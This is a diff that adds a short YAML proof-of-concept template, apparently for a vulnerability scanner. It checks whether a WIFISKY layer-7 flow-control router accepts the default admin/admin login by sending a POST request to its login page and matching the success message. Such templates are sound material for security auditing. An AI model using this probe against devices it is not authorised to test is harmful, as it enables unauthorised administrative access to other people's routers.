@@ -1,0 +1,16 @@
+name: poc-yaml-WIFISKY7层流控路由器-admin-default-passwd
+description: >-
+  登录方式:admin/admin
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /login.php?action=login&type=admin
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "username=admin&password=admin"
+    expression:
+      status: 200
+      body_any:
+        - "success"
+        - "您正在使用默认密码登录"
